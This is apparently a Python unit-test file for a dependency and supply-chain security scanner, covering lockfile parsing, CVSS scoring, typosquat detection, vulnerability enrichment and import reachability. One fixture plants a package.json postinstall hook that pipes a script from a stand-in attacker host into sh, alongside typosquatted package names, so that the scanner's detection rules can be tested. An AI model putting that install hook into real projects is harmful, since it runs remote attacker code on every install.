import json
import unittest
from unittest import mock

from tests.helpers import rule_ids, scan_tree

from rempart.scanners import deps as deps_mod
from rempart.scanners.deps import _dl1, cvss3_base, vuln_severity
from rempart.scanners.lockfiles import parse_go_mod, parse_package_lock, parse_pnpm_lock, parse_requirements, parse_yarn_lock
from rempart.models import Severity

LOCK = json.dumps({"lockfileVersion": 3, "packages": {"": {"name": "app"}, "node_modules/lodash": {"version": "4.17.15"},
                                                       "node_modules/a/node_modules/@scope/b": {"version": "1.0.0"}}}, indent=2)


class LockfileTest(unittest.TestCase):
    def test_package_lock(self):
        got = {(p.name, p.version) for p in parse_package_lock("package-lock.json", LOCK)}
        self.assertEqual(got, {("lodash", "4.17.15"), ("@scope/b", "1.0.0")})

    def test_pnpm(self):
        text = "lockfileVersion: '9.0'\n\npackages:\n\n  '@sveltejs/kit@2.5.0':\n    resolution: {}\n\n  lodash@4.17.21:\n    resolution: {}\n\n  /react@18.2.0(x@1):\n    resolution: {}\n"
        got = {(p.name, p.version) for p in parse_pnpm_lock("pnpm-lock.yaml", text)}
        self.assertEqual(got, {("@sveltejs/kit", "2.5.0"), ("lodash", "4.17.21"), ("react", "18.2.0")})

    def test_yarn(self):
        v1 = '"@babel/core@^7.0.0", "@babel/core@^7.1.0":\n  version "7.24.0"\n\nlodash@^4.17.0:\n  version "4.17.21"\n'
        berry = '__metadata:\n  version: 6\n\n"lodash@npm:^4.17.21":\n  version: 4.17.21\n'
        self.assertEqual({(p.name, p.version) for p in parse_yarn_lock("yarn.lock", v1)}, {("@babel/core", "7.24.0"), ("lodash", "4.17.21")})
        self.assertEqual({(p.name, p.version) for p in parse_yarn_lock("yarn.lock", berry)}, {("lodash", "4.17.21")})

    def test_requirements_and_go(self):
        self.assertEqual([(p.name, p.version) for p in parse_requirements("r.txt", "django==4.2.1\nflask>=2\nrequests[socks]==2.31.0 # c\n")],
                         [("django", "4.2.1"), ("requests", "2.31.0")])
        gomod = "module x\n\nrequire (\n\tgithub.com/gin-gonic/gin v1.9.0\n\tgolang.org/x/net v0.17.0 // indirect\n)\nrequire github.com/a/b v1.0.0\n"
        self.assertEqual(len(list(parse_go_mod("go.mod", gomod))), 3)


class ScoringTest(unittest.TestCase):
    def test_cvss(self):
        self.assertEqual(cvss3_base("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"), 10.0)
        self.assertEqual(cvss3_base("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"), 9.8)
        self.assertEqual(cvss3_base("CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"), 4.3)
        self.assertIsNone(cvss3_base("garbage"))

    def test_severity_from_ghsa_label(self):
        self.assertEqual(vuln_severity({"database_specific": {"severity": "MODERATE"}})[0], Severity.MEDIUM)

    def test_typosquat_distance(self):
        self.assertTrue(_dl1("lodahs", "lodash"))
        self.assertTrue(_dl1("expres", "express"))
        self.assertFalse(_dl1("react", "react"))
        self.assertFalse(_dl1("preact", "react-dom"))


class HygieneTest(unittest.TestCase):
    def test_supply_chain_hygiene(self):
        ids = rule_ids(scan_tree({
            "package.json": json.dumps({"name": "x", "scripts": {"postinstall": "curl -s https://evil.example/x.sh | sh"},
                                        "dependencies": {"lodahs": "^1.0.0", "left-pad": "latest", "util": "github:someone/util"}}),
            "requirements.txt": "--extra-index-url https://pypi.internal.example/simple\nreqeusts==2.0.0\nflask>=2\n",
        }, ["dependencies"]))
        expected = {"SUPPLY-INSTALL-SCRIPT", "SUPPLY-TYPOSQUAT", "SUPPLY-UNPINNED", "SUPPLY-NO-LOCKFILE", "SUPPLY-DEPENDENCY-CONFUSION", "DEP-LOOKUP-SKIPPED"}
        self.assertTrue(expected <= ids, expected - ids)

    def test_vulnerability_enrichment_with_mocked_feeds(self):
        def fake(url, **kw):
            if url == deps_mod.OSV_BATCH:
                return {"results": [{"vulns": [{"id": "GHSA-test-0001"}, {"id": "MAL-2025-1"}]}]}
            if url.endswith("GHSA-test-0001"):
                return {"id": "GHSA-test-0001", "aliases": ["CVE-2099-0001"], "summary": "Prototype pollution",
                        "database_specific": {"severity": "HIGH"},
                        "affected": [{"package": {"name": "lodash"}, "ranges": [{"events": [{"introduced": "0"}, {"fixed": "4.17.21"}]}]}]}
            if url.endswith("MAL-2025-1"):
                return {"id": "MAL-2025-1"}
            if url == deps_mod.KEV_URL:
                return {"vulnerabilities": [{"cveID": "CVE-2099-0001"}]}
            if url.startswith("https://api.first.org"):
                return {"data": [{"cve": "CVE-2099-0001", "epss": "0.91"}]}
            raise AssertionError(url)

        from rempart.config import Config
        from rempart.engine import run_scan
        from tests.helpers import write_tree
        import tempfile
        from pathlib import Path
        root = Path(tempfile.mkdtemp())
        write_tree(root, {"package-lock.json": json.dumps({"lockfileVersion": 3, "packages": {"node_modules/lodash": {"version": "4.17.15"}}})})
        with mock.patch.object(deps_mod, "safe_get_json", side_effect=fake):
            res = run_scan(root, [deps_mod.DependencyScanner()], Config())
        vuln = next(f for f in res.findings if f.rule.id == "DEP-VULNERABLE")
        self.assertEqual(vuln.severity, Severity.CRITICAL)  # KEV overrides HIGH
        self.assertTrue(vuln.extra["kev"])
        self.assertEqual(vuln.extra["fixed"], ["4.17.21"])
        self.assertGreaterEqual(vuln.risk, 95)
        self.assertIn("DEP-MALICIOUS", rule_ids(res))


if __name__ == "__main__":
    unittest.main()


class ReachabilityTest(unittest.TestCase):
    def test_classify_imports_and_direct(self):
        from rempart.reachability import classify, direct_dependencies, imported_names
        files = {
            "package.json": json.dumps({"dependencies": {"lodash": "^4", "@scope/ui": "1"}}),
            "src/a.ts": "import _ from 'lodash';\nimport x from '@scope/ui/button';\n",
            "requirements.txt": "PyYAML==6.0\nrequests==2.31.0\n",
            "app.py": "import yaml\nfrom requests.adapters import HTTPAdapter\n",
        }
        imp = imported_names(files, files.get)
        dire = direct_dependencies(files, files.get)
        self.assertEqual(classify("npm", "lodash", imp, dire), (True, True))
        self.assertEqual(classify("npm", "@scope/ui", imp, dire), (True, True))
        self.assertEqual(classify("npm", "minimist", imp, dire), (False, False))
        self.assertEqual(classify("PyPI", "PyYAML", imp, dire), (True, True))
        self.assertEqual(classify("PyPI", "urllib3", imp, dire), (False, False))
